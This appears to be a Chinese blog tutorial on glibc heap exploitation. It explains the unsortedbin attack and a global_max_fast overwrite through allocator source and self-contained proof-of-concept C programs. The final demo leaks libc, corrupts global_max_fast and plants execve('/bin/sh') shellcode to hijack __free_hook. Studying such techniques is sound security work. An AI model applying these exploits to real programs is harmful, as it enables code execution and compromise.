&emsp;&emsp;<font size=2>unsortedbin的原理其实非常简单，就是利用了unsortedbin脱钩的操作来达到一次任意地址写，但是也只能是一次，利用完成后unsortedbin list就废了，然后我们从shellphish的一个最简单的demo入手：</font></br>

```C
	unsigned long stack_var=0;

	unsigned long *p=malloc(400);
	malloc(500);

	free(p);
	p[1]=(unsigned long)(&stack_var-2);

	malloc(400);
```

&emsp;&emsp;<font size=2>我同样假设你已经看过我的malloc和free两部曲了，接下来会省略一些细节，首先我们来学习什么是unsortedbin，直接看`_int_free`内部：</font></br>

```C
#define unsorted_chunks(M)          (bin_at (M, 1))
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))                           \
             - offsetof (struct malloc_chunk, fd))

  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
  {
    //...
  }
  else if (!chunk_is_mmapped(p)) {
    if (! have_lock) {
      (void)mutex_lock(&av->mutex);
      locked = 1;
    }

    nextchunk = chunk_at_offset(p, size);

    //这里跳过安全检查
    //....

    nextsize = chunksize(nextchunk);

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      /*
        Place the chunk in unsorted chunk list. Chunks are
        not placed into regular bins until after they have
        been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }

```

&emsp;&emsp;<font size=2>这些就够了，我们的堆块不属于mmap映射的内存，且不是fastbin，是smallbin，相邻堆块为占用态，因此控制流如上。可以看到这种情况下`free`的操作就是置位了下一个堆块的`pre_inuse`位，然后`bck`获取了unsortedbin的地址。接下来的：</font></br>

- `p->fd = fwd`和`p->bk = bck`就是我们泄漏libc地址最常用的手法的原理；
- `bck->fd = p`和`fwd->bk = p`就是设置了unsortedbin list的`bk`和`fd`指向我们刚刚free的smallbin。

&emsp;&emsp;<font size=2>那么什么是unsortedbin呢？为什么我们要先了解他？unsortedbin是smallbin被放入malloc_state->bins这个空闲堆块表之前的一个中转站，刚被free的堆块不会立马被放入main_arena的bins中，而是先链入unsortedbin list备用以提高内存效率。只有在下一次调用malloc时且bins没有匹配到堆块时，才会执行unsortedbin清空，把堆块都放入bins里的操作，这些注释里也有提到。</font></br>

&emsp;&emsp;<font size=2>然后我们看第二个`malloc(400)`的`_int_malloc`：</font></br>

```C
  checked_request2size (bytes, nb);

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
  {
    //...
  }

  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          //...
        }
    }

  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              //...
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
          //...
        }
    }
```

&emsp;&emsp;<font size=2>有些宏的意思就不放了，顾名思义也能猜出来的作用。接下来著名的unsortedbin attack的原理就在这了，是这两行：</font></br>

```C
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

&emsp;&emsp;<font size=2>这里的`victim`就是我们释放的第一个堆块，其fd指针我们修改为了`stack_var-0x10`的地址处，因此`bck`就是`stack_var-0x10`，也就是说第二行代码相当于完成了一次`[&stack_var-0x10+0x10] = &unsortedbin`的任意地址写操作，但是这个操作也导致了`unsortedbin list`的`bk`指针也被修改为了`&stack_var`，破坏了`unsortedbin list`，这样当我们分配新的smallbin或者largebin时程序就会崩溃，除非能修复（一般没这个机会了），不然只能使用fastbin了。</font></br>

&emsp;&emsp;<font size=2>然后`_int_malloc`就返回了我们第一次释放的堆块p，同时`stack_var`也已经被修改为了`&unsortedbin list`，完整的demo程序如下（这里提一句，要么一开始就用printf，不要在unsortedbin attack之后使用printf，因为`_IO_FILE`的初始化也会分配堆块，同样会触发unsortedbin list的检查异常）：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

//直接用setvbuf保持堆区干净是最好的
void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main(){

	unsigned long stack_var=0;
	unsigned long *p=malloc(400);

	setbufs();
	//printf("hello,world!\n");

	p = malloc(400);
	malloc(500);

	free(p);
	p[1]=(unsigned long)(&stack_var-2);

	malloc(400);

	printf("stack_var: 0x%llx\n",stack_var);

	return 0;
}
```



----

#### exploit global_max_fast

&emsp;&emsp;<font size=2>按照惯例，每次分析完了之后都要来一些甜品技术，这里就列一个利用`unsortedbin attack`任意地址写到`global_max_fast`来实现可控的利用吧，技术原理其实看过两部曲和上面这篇文章之后就可以理解了。</font></br>

&emsp;&emsp;<font size=2>我们之前看malloc分析的时候有一个全局变量叫`global_max_fast`，而且我们也知道就是这个变量设定了fastbin的最大大小，倘若我们通过某种手法把这个变量改的很大，那么我们接下来分配或者释放的堆块都会先进入fastbin的逻辑。回忆一下，main_arena中堆块表fastbinY和bins是什么时候被改写的？就是free的时候，用main_arena中堆块表中记录的堆块地址判断是否是同种size堆块的第一次释放，或者是根据记录进行被释放堆块的大小检查进而更新一下堆块的fd、bk指针，而其中fastbin的检查又最为简单，仅仅只是检查了一下是否存在double free。我们看如下`_int_free`中的fastbin部分的判断逻辑：</font></br>

```C
  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
        If TRIM_FASTBINS set, don't place chunks
        bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    //...

    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

    set_fastchunks(av);
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;
    unsigned int old_idx = ~0u;
    do
      {
        /* Check that the top of the bin is not the record we are going to add
           (i.e., double free).  */
        if (__builtin_expect (old == p, 0))
          {
            errstr = "double free or corruption (fasttop)";
            goto errout;
          }
        /* Check that size of fastbin chunk at the top is the same as
           size of the chunk that we are adding.  We can dereference OLD
           only if we have the lock, otherwise it might have already been
           deallocated.  See use of OLD_IDX below for the actual check.  */
        if (have_lock && old != NULL)
          old_idx = fastbin_index(chunksize(old));
        p->fd = old2 = old;
      }
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);

    if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0))
      {
        errstr = "invalid fastbin entry (free)";
        goto errout;
      }
  }


```

&emsp;&emsp;<font size=2>可以看到我们几乎不需要考虑绕过这些检查，只要不double free就不会有问题。在这里：</font></br>

```C
p->fd = old2 = old;
```

&emsp;&emsp;<font size=2>就是空闲fastbin的组织形式，每一个被free的fastbin的fd指向上一个堆块，bk不使用。当然是同大小的fastbin。然后后面的：</font></br>

```C
catomic_compare_and_exchange_val_rel (fb, p, old2)
```

&emsp;&emsp;<font size=2>这里的fb指向我们的试图修改的数据，是我们释放的堆块的size经过`fastbin_index`和`fastbin`两个宏计算得到的地址，而p就是我们刚释放的堆块，然后完成了一个`mov [fb],p`的操作。如果堆块可以执行的话我们可以直接让fb指向`__free_hook`，然后在p上放上我们的shellcode就行了，不过注意这里的p是指向堆块头部而不是主体，而且之前的`p->fd = old`会重写fd，所以我们可以创建一个重叠堆块，在修改完`__free_hook`后覆盖p地址为shellcode，这样下次free的时候就能执行shellcode了。</font></br>

&emsp;&emsp;<font size=2>在实际中可以用来劫持`vtable`或者整个`_IO_FILE`结构，`__free_hook`的话可能遇不到可以直接执行shellcode的情况，但是这里就不展开讲了，因为这一节主要是讲unsortedbin，不能跑太偏，一切简单为主，`global_max_fast`的利用demo就放下面了：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

// fastbin size convert to address
#define offset2size(x)	((x)<<1)
#define ul unsigned long

unsigned char shellcode[]="\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main(){

	ul libc_base = 0;
	ul global_max_fast = 0;
	ul __free_hook = 0x3c67a8;
	ul main_arena = 0x3c4b20;
	ul *p, *p1, *p2, *p3, *p4;

	setbufs();

	p1 = malloc(0x100);
	p2 = malloc(0x20);

	free(p1);
	libc_base = *(ul*)p1;
	libc_base -= 0x3c4b78;
	global_max_fast = libc_base + 0x3c67f8;
	free(p2);
	printf("libc_base is :%lx\n", libc_base);
	printf("&(global_max_fast) is :%lx\n", global_max_fast);
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	p1 = malloc(0x100);
	p2 = malloc(0x20);
	p3 = malloc(offset2size(__free_hook-main_arena));
	malloc(0x20);

	free(p1);
	p = (ul*)p1;
	//*(p+1) = (ul)&libc_base - sizeof(ul*)*2;
	//malloc(0x100);
	//printf("after unsorted-bin attack is :%lx\n", libc_base);

	*(p+1) = global_max_fast - sizeof(ul*)*2;
	malloc(0x100);
	printf("after unsorted-bin attack\n");
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	free(p3);
	ul page = ((ul)p3-sizeof(ul*)*2)&(~0xFFF);
	mprotect((void*)page, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
	memcpy((void*)((ul)p3-sizeof(ul*)*2), shellcode, sizeof(shellcode));

	// do not malloc
	free(p2);


	return 0;
}
```

&emsp;&emsp;<font size=2>就先这些吧，涉及`_IO_FILE`的下次再整合成另外一篇文章发，因为`_IO_FILE`的内容也挺多的，如果把所有利用技巧都放在一篇文章可能太庞大了，所以分为基础利用和进阶吧，那就这样了，下一章待续。</font></br>